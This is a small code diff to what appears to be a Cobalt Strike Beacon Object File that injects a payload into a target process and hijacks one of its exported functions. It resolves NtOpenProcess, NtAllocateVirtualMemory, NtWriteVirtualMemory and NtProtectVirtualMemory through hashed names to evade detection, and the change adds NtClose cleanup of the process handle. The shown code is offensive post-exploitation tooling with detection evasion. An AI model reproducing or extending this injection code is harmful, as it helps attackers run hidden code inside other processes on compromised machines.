@@ -8,6 +8,7 @@
 #define HashStringNtAllocateVirtualMemory 0xf7eb76b1
 #define HashStringNtProtectVirtualMemory 0xae75b471
 #define HashStringNtWriteVirtualMemory 0x8513601
+#define HashStringNtClose 0xa3ec3880
 
 #define HashStringA(x) HashStringFowlerNollVoVariant1aA(x)
 #define HashStringW(x) HashStringFowlerNollVoVariant1aW(x)
@@ -161,11 +162,13 @@ void go(char* args, int alen) {
     typeNtAllocateVirtualMemory pNtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtAllocateVirtualMemory);
     typeNtProtectVirtualMemory pNtProtectVirtualMemory = (typeNtProtectVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtProtectVirtualMemory);
     typeNtWriteVirtualMemory pNtWriteVirtualMemory = (typeNtWriteVirtualMemory)_GetProcAddress(ntdllBase, HashStringNtWriteVirtualMemory);
+    typeNtClose pNtClose = (typeNtClose)_GetProcAddress(ntdllBase, HashStringNtClose );
     
     if (pNtOpenProcess == 0
         || pNtAllocateVirtualMemory == 0
         || pNtProtectVirtualMemory == 0
-        || pNtWriteVirtualMemory == 0)
+        || pNtWriteVirtualMemory == 0
+        || pNtClose == 0)
     {
         BeaconPrintf(CALLBACK_ERROR, "Unable to locate NTAPI functions from ntdll.dll");
         return;
@@ -263,6 +266,7 @@ void go(char* args, int alen) {
     }
 
     BeaconOutput(CALLBACK_OUTPUT, "Injection complete. Payload will execute when the targeted process calls the export", 84);
+    pNtClose( pHandle );
 
     return;
 }
